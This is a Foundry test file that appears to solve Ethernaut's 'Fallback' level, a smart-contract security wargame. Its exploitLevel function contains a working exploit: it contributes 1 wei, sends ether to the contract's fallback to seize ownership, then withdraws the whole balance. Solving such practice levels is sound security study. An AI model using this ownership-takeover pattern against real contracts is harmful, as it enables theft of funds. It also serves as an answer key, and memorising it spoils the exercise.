// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {console, Test} from "forge-std/Test.sol";
import {Fallback} from "../../src/01/Fallback.sol";
import {HelperConfig} from "../../script/HelperConfig.s.sol";
import {FallbackFactory} from "src/01/FallbackFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {BaseTest} from "../BaseTest.sol";
import {Vm} from "forge-std/Vm.sol";

contract FallbackTest is Test, BaseTest {
    Fallback public instanceContract;

    constructor() {
        // SETUP LEVEL FACTORY
        levelFactory = address(new FallbackFactory());
        vm.deal(owner, 1 ether);
        vm.deal(player, 2 ether);
    }

    function setUp() public override {
        super.setUp();

        instanceContract = Fallback(instance);
    }

    function testIsCorrectOwnerOfFallbackContract() public {
        assert(instanceContract.owner() == address(levelFactory));
        assertEq(instanceContract.contributions(levelFactory), 1000 * (1 ether));
    }

    function testRevertsIfNotCorrectOwnerOfFallbackContract() public {
        vm.expectRevert(abi.encodePacked("caller is not the owner"));
        instanceContract.withdraw();
    }

    function testRunLevel() public {
        runLevel();
    }

    function exploitLevel() internal override {
        uint256 balanceBeforeAttack = address(instanceContract).balance;

        vm.startPrank(player);

        instanceContract.contribute{value: 1 wei}();
        (bool sent,) = address(instanceContract).call{value: 1 wei}("");
        require(sent, "Failed to send Ether");
        instanceContract.withdraw();

        vm.stopPrank();

        assert(instanceContract.owner() == player);
        assertEq(address(instanceContract).balance, 0);
        assertEq(player.balance, balanceBeforeAttack + 1 ether);
    }
}
